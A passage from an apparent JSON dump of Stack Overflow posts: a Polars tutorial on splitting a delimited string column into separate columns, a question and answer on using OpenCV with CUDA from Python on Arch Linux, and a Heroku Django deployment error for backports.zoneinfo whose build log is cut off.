\u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2506 dog       \u2506 aardvark  \u2506 mouse     \u2506 frog      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\nHow it works\nWe first assign a row number id (which we'll need later), and use split to separate the strings.  Note that the split strings form a list.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n)\n\nshape: (5, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 split_str                  \u2502\n\u2502 --- \u2506 ---                         \u2506 ---                        \u2502\n\u2502 u32 \u2506 str                         \u2506 list[str]                  \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 [\"cat\"]                    \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 [\"cat\", \"dog\"]             \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null                       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506 [\"\"]                       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 [\"cat\", \"dog\", ... \"frog\"] \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nNext, we'll use explode to put each string on its own row.  (Notice how the id column tracks the original row that each string came from.)\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n)\n\nshape: (10, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 split_str \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 dog       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 dog       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 aardvark  \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 mouse     \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 frog      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nIn the next step, we're going to generate our column names.  I chose to call each column string_XX where XX is the offset with regards to the original string.\nI've used the handy zfill expression so that 1 becomes 01.  (This makes sure that string_02 comes before string_10 if you decide to sort your columns later.)\nYou can substitute your own naming in this step as you need.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n    .with_column(\n        (\"string_\" + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))\n        .over(\"id\")\n        .alias(\"col_nm\")\n    )\n)\n\nshape: (10, 4)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 split_str \u2506 col_nm    \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 dog       \u2506 string_01 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null      \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 dog       \u2506 string_01 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 aardvark  \u2506 string_02 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 mouse     \u2506 string_03 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 frog      \u2506 string_04 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nIn the next step, we'll use the pivot function to place each string in its own column.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n    .with_column(\n        (\"string_\" + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))\n        .over(\"id\")\n        .alias(\"col_nm\")\n    )\n    .pivot(\n        index=['id', 'my_str'],\n        values='split_str',\n        columns='col_nm',\n    )\n)\n\nshape: (5, 7)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 string_00 \u2506 string_01 \u2506 string_02 \u2506 string_03 \u2506 string_04 \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2506 dog       \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2506 dog       \u2506 aardvark  \u2506 mouse     \u2506 frog      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nAll that remains is to use fill_null to replace the null values with an empty string \"\".  Notice that I've used a regex expression in the col expression to target only those columns whose names start with \"string_\".  (Depending on your other data, you may not want to replace null with \"\" everywhere in your data.)\n"
}
{
    "Id": 73143854,
    "PostTypeId": 1,
    "Title": "Linking opencv-python to opencv-cuda in Arch",
    "Body": "I'm trying to to get OpenCV with CUDA to be used in Python open-cv on Arch Linux, but I'm not sure how to link it.\nArch provides a package opencv-cuda, which provides these files.\nGuides I've found said to link the python cv2.so to the one provided, but the package doesn't provide that. My python site_packages has cv2.abi3.so in it, and I've tried linking that to core.so and cvv.so to no avail.\nDo I need to build it differently to support Python? Or is there another step I'm missing?\n",
    "AcceptedAnswerId": 73227581,
    "AcceptedAnswer": "On Arch, opencv-cuda provides opencv=4.6.0, but you still need the python bindings. Fortunately though, installing python-opencv after installling opencv-cuda works, since it leverages it.\nI just set up my Python virtual environment to allow system site packages (python -m venv .venv --system-site-packages), and it works like a charm! Neural net image detection runs ~300% as fast now.\n"
}
{
    "Id": 71712258,
    "PostTypeId": 1,
    "Title": "ERROR: Could not build wheels for backports.zoneinfo, which is required to install pyproject.toml-based projects",
    "Body": "The Heroku Build is returning this error when I'm trying to deploy a Django application for the past few days. The Django Code and File Structure are the same as Django's Official Documentation and Procfile is added in the root folder.\nLog -\n-----> Building on the Heroku-20 stack\n-----> Determining which buildpack to use for this app\n-----> Python app detected\n-----> No Python version was specified. Using the buildpack default: python-3.10.4\n       To use a different version, see: https://devcenter.heroku.com/articles/python-runtimes\n       Building wheels for collected packages: backports.zoneinfo\n         Building wheel for backports.zoneinfo (pyproject.toml): started\n         Building wheel for backports.zoneinfo (pyproject.toml): finished with status 'error'\n         ERROR: Command errored out with exit status 1:\n          command: /app/.heroku/python/bin/python /app/.heroku/python/lib/python3.10/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpqqu_1qow\n              cwd: /tmp/pip-install-txfn1ua9/backports-zoneinfo_a462ef61051d49e7bf54e715f78a34f1\n         Complete output (41 lines):\n         running bdist_wheel\n         running build\n         running build_py\n         creating build\n         creating build/lib.linux-x86_64-3.10\n         creating build/lib.linux-x86_64-3.10/backports\n         copying src/backports/__init__.py -> build/lib.linux-x86_64-3.10/backports\n         creating build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_zoneinfo.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_tzpath.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_common.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/_version.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/__init__.py -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         running egg_info\n         writing src/backports.zoneinfo.egg-info/PKG-INFO\n         writing dependency_links to src/backports.zoneinfo.egg-info/dependency_links.txt\n         writing requirements to src/backports.zoneinfo.egg-info/requires.txt\n         writing top-level names to src/backports.zoneinfo.egg-info/top_level.txt\n         reading manifest file 